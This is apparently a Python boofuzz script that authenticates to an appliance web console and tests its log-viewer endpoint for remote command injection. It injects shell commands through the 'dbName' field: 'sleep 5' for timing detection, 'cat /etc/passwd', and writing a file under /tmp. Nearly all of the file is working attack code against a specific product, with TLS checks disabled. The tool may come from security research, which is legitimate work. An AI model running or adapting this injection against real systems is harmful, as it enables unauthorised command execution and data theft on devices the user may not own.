import sys
import traceback

import requests
from boofuzz import Session, Target, SocketConnection, s_initialize, s_static, s_delim, s_string
from boofuzz import *
import ssl
import time

t = 0
duration_time = 5


# 20240321 finish basic fuzz and function

def extract_csrf_token(text):
    # page csrf key, refresh each visit
    s = text.find('c$rFt0k3n')
    e = text[s:].find(';')
    token = text[s + 13:s + e - 1]
    return token


def get_cookie_token(ip, port, username, passwd):
    # 1.login web to get cookie and csrf_token by requests
    global cookie, csrf_token
    try:
        r = requests.post(url='https://{}:{}/webconsole/Controller'.format(ip, port),
                          data='mode=151&json=%7B%22username%22%3A%22{}%22%2C%22password%22%3A%22{}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_87%22%7D&__RequestType=ajax&t='.format(
                              username, passwd) + str(int(time.time()) + 3600) + '999', verify=False,
                          headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
                                   'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
                                   'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                   'X-Requested-With': 'XMLHttpRequest'})
        # print(r.text)
        # get cookie and jsessionid
        cookie = r.cookies.items()[0][1]

        print(f"[D] get_cookie_token() JSESSIONID is: {cookie}")

        # get csrf_token
        url0 = 'https://{}:{}/webconsole/webpages/index.jsp'.format(ip, port)
        r = requests.get(url=url0, headers={
            'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
            'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
            'Cookie': 'JSESSIONID={}'.format(cookie)}, verify=False)

        csrf_token = extract_csrf_token(r.text)

        print(f"[D] get_cookie_token() csrf token is: {csrf_token}")

        # print("[D] response header: ", r.headers)
    except Exception as err:
        traceback.print_exc()
    return cookie, csrf_token


def set_start_time(target, fuzz_data_logger, session, *args, **kwargs):
    global t
    t = time.time()

# Session -> post_test_case_callbacks
def resp(target, fuzz_data_logger, session, *args, **kwargs):
    print('--' * 66)
    try:
        # time.sleep(2)  # just for test
        print("[D] Active received data: ")
        # print(target.recv().decode())   # 没有数据，可能是因为在Session启用了receive_data_after_fuzz=True，所以可能在session.last_recv？
        print(session.last_recv)

        json_resp = target.recv()
        print("[D] get second response: ")
        if json_resp:
            json_str = json_resp.decode()
            print(json_str)
            if "Session Expired" in json_str:
                print("[W] Session Expired !!!!")
            if '"status":200' in json_str:
                print("[D] Normal output ...")

        print("~" * 33)
        fuzz_data_logger.log_check(session.last_send)
        print("~" * 33)
        print(session.last_send.decode())
        print("~" * 33)

        # if 'redirectionURL' in target.recv(10240).decode():
        #     fuzz_data_logger.log_check(session.last_send)

        # 1 check response time, duration_time
        global t

        delta_t = time.time() - t
        print(f"{t} >>>> {delta_t}")
        if delta_t > duration_time:
            print("[!!!] delta time > specific seconds")
            # write check log in sqlite, if backend need, can send encapsulated data to web api
            fuzz_data_logger.log_info(
                ">>>>> [Bingo!] delta time > specific seconds, maybe sleep injection execute success")

            # for check testcase send data
            # print(f"[D] session last_send: {session.last_send.decode()}")
            fuzz_data_logger.log_check(session.last_send)
            fuzz_data_logger.log_info(f"current test_case_count: {fuzz_data_logger.test_case_count}")

        # 2 check keywords （no use in the scene）

        # 3 check no response, maybe use monitor is better （no use in the scene）

    except:
        fuzz_data_logger.log_fail("Unable to connect ...")
    print('=' * 66)


# 单节点步骤2测试通过
def main(ip, port, username, password):
    # normal use
    cookie, csrf_token = get_cookie_token(ip, port, username, password)

    # # test expired use
    # cookie = "vbyvfs0bfwd613s00j5kt7mew"
    # csrf_token = "7kchdt78ui3sf9pok233e3gmnq"

    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    session = Session(target=Target(
        connection=SSLSocketConnection(host=ip, port=port, sslcontext=ctx, recv_timeout=15)),
        restart_threshold=1,
        post_test_case_callbacks=[resp],
        # post_test_case_callbacks=[ad],
        receive_data_after_fuzz=True,
        pre_send_callbacks=[set_start_time],
        web_address='0.0.0.0',
        sleep_time=1
    )

    s_initialize(name='rce_fuzz')

    with s_block("Request-Line"):
        # s_static(
        #     'POST ' + '/webconsole/Controller' + ' HTTP/1.1\r\nHost: {}:{}\r\n'.format(ip, port))
        s_group("Method", ['POST'])
        s_delim(" ", name='space-1', fuzzable=False)  # fuzz
        # s_static(" ", name='space-1')  # static
        s_static("/webconsole/Controller", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable=False)  # fuzz
        # s_static(" ", name='space-2')
        s_static('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")

        s_static(f"Host: {ip}:{port}\r\n")
        s_static(f"Cookie: JSESSIONID={cookie}\r\n")
        s_static(
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\n")
        s_static("Accept: text/plain, */*; q=0.01\r\n")
        s_static("Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n")
        s_static("Accept-Encoding: gzip, deflate, br\r\n")
        s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
        s_static("X-Requested-With: XMLHttpRequest\r\n")
        s_static(f"X-Csrf-Token: {csrf_token}\r\n")
        s_static("Content-Length: 308\r\n")
        s_static(f"Origin: https://{ip}:{port}\r\n")
        s_static(
            f"Referer: https://{ip}:{port}/webconsole/webpages/logging/EventViewer.jsp?selectedTab=log_viewer&csrf={csrf_token}\r\n")
        s_static("Sec-Fetch-Dest: empty\r\n")
        s_static("Sec-Fetch-Mode: cors\r\n")
        s_static("Sec-Fetch-Site: same-origin\r\n")
        s_static("Te: trailers\r\n")
        s_static("Connection: close\r\n")

        # s_size('body_content', fuzzable=False, output_format='ascii')

    s_static("\r\n", name="Request-CRLF")

    with s_block('body_content'):
        s_static(
            "mode=5001&json=%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3B")

        ## single cmd test
        # s_static('sleep%205')
        # s_static('cat%20%2Fetc%2Fpasswd%20%2Ftmp')
        # s_static('date%20%3E%20%2Ftmp%2F111')

        # real fuzz logic, input can change in here todo
        s_group("custom_cmd", ['sleep%205', 'cat%20%2Fetc%2Fpasswd%20%2Ftmp', 'date%20%3E%20%2Ftmp%2F222test'])

        s_static(
            f"%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D&__RequestType=ajax&t={int(time.time())}990&a=")
        # s_random(min_length=1, max_length=1)  # just add for launch fuzzer
        # s_random("0", min_length=1, max_length=1, num_mutations=3)  # num_mutations, fuzz mutation times

        s_group("ava", ['a', 'b', 'c', 'd', 'e',
                        'f'])  # s_group() had a known bug in github, 1st element, here is 'a', won't use.

    session.connect(s_get('rce_fuzz'))
    # session.fuzz()
    session.fuzz(max_depth=1)
    print("-------")


if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    username = sys.argv[3]
    password = sys.argv[4]
    main(ip, int(port), username, password)
